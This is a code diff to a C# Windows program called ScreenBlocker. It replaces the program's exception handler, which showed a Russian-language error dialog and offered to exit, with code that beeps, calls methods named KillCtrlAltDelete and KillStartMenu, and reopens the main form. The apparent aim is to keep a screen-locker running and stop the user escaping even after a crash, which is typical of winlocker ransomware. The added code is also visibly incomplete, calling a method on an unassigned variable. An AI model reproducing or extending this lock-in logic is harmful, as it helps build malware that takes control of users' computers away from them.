@@ -17,6 +17,7 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
 using System.IO;
+using System.Media;
 
 namespace ScreenBlocker
 {
@@ -43,20 +44,26 @@ namespace ScreenBlocker
 		
 		static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
 		{
-		  	DialogResult result = DialogResult.Abort;
-			try
-			{
-			  result = MessageBox.Show("Оюшки! Пожалуйста, свяжитесь с разработчиками, сообщив им" 
-			  + " следующую информации:\n\n" + e.Exception.Message + e.Exception.StackTrace, 
-			  "Ошибка программы", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Stop);
-			}
-			finally
-			{
-			if (result == DialogResult.Abort)
-				{
-			   		Application.Exit();
-				}
-  			}
+			SystemSounds.Beep.Play();
+			AddHooks ad;
+			ad.SomeMethod();
+			ad.KillCtrlAltDelete();
+			ad.KillStartMenu();
+			MainForm.Show();
+//		  	DialogResult result = DialogResult.Abort;
+//			try
+//			{
+//			  result = MessageBox.Show("Оюшки! Пожалуйста, свяжитесь с разработчиками, сообщив им" 
+//			  + " следующую информации:\n\n" + e.Exception.Message + e.Exception.StackTrace, 
+//			  "Ошибка программы", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Stop);
+//			}
+//			finally
+//			{
+//			if (result == DialogResult.Abort)
+//				{
+//			   		Application.Exit();
+//				}
+//  			}
 		}
 		
 		static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
